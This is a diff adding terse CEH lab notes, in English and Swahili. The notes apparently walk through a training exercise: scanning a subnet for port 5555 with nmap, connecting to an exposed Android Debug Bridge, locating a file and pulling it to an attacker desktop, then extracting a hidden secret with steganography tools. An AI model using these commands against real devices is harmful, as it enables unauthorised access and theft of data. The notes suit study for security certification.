@@ -1,0 +1,13 @@
+1. nmap -p 5555 ip/24
+2. adb connect ip:5555
+3. adb Shell
+4. I started looking for the file
+find / -name “name.txt” 2>/dev/null OR (ls -R / | grep “name.txt”) OR busybox find / -name
+“name.txt”
+5. Go back to my terminal
+- adb pull /sdcard/Download/Ceh.png /home/attacker/Desktop
+6. strings. Zsteg, exiftool
+7. stegonline, openstego use Python to send the file to Windows ftp,smb,ssh
+kwenye Linux kwenye directory ilipo picha unaandika python -m http.server 8000
+then unaenda kwenye window http://LinuxIP:8000 then enter utaiona picha yako unai
+download then unatumia openstego (window server 2019) kutafuta secret iliyopo.
